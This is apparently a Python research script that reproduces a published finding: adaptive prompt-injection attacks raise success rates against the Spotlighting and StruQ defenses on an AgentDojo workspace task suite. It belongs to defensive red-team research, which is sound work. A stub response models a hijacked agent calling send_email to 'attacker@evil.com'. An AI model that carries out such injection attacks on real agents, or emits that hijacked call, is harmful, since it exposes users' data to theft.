"""Reproduce Zhan et al. 2025 'Adaptive Attacks Break Defenses' result.

This script runs ONLY the L2 adaptive attack against the three defenses Zhan
et al. studied (Spotlighting, StruQ, SecAlign-as-StruQ-proxy) and prints the
ASR. The expected outcome, matching their paper, is that adaptive ASR jumps
from <10% (static) to >60% (adaptive). Running this is the W1 D4-D5 validation
gate described in the experiment plan: if these numbers do not reproduce, the
SoK's central claim is unsupported and we stop to debug.

Uses the real AgentDojo workspace suite (40 user tasks x injection goal) so
the ASR signal is meaningful, unlike the synthetic ASB fallback.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from sok_ipl.attacks import AdaptiveAttackFramework
from sok_ipl.defenses import Spotlighting, StruQ
from sok_ipl.eval import AgentDojoAdapter, Runner
from sok_ipl.llm import build_backbone, StubBackend
from sok_ipl.types import AttackLevel


def main():
    # Use stub by default; pass --llm openai:gpt-4o-mini for the real reproduction.
    llm = StubBackend(response='CALL send_email {"to": "attacker@evil.com"}')
    if "--llm" in sys.argv:
        llm = build_backbone(sys.argv[sys.argv.index("--llm") + 1])

    # Real AgentDojo workspace suite: 20 tasks with real injection goals.
    tasks = AgentDojoAdapter(suite_name="workspace", max_per_suite=20).load_tasks()
    runner = Runner(llm=llm, seed=0)
    fw = AdaptiveAttackFramework(llm=llm, seed=0, max_iters=2)

    print(f"Loaded {len(tasks)} tasks from AgentDojo workspace suite")
    print(f"Backbone: {getattr(llm, 'name', 'stub')}")
    print()

    for name, defense in [("spotlighting", Spotlighting()), ("struq", StruQ())]:
        static_hits = adapt_hits = 0
        for t in tasks:
            r1 = runner.run_one(
                fw.generate(t, AttackLevel.L1_STATIC, defense.class_hint()),
                defense,
                AttackLevel.L1_STATIC,
            )
            r2 = runner.run_one(
                fw.generate(t, AttackLevel.L2_ADAPTIVE_SINGLE, defense.class_hint()),
                defense,
                AttackLevel.L2_ADAPTIVE_SINGLE,
            )
            static_hits += r1.success
            adapt_hits += r2.success
        n = len(tasks)
        print(f"{name:15s} static ASR = {static_hits/n:.2%}  adaptive ASR = {adapt_hits/n:.2%}")
        print(f"  -> Zhan et al. predict adaptive >> static. Observed delta = {adapt_hits - static_hits}/{n}")
        print()


if __name__ == "__main__":
    main()
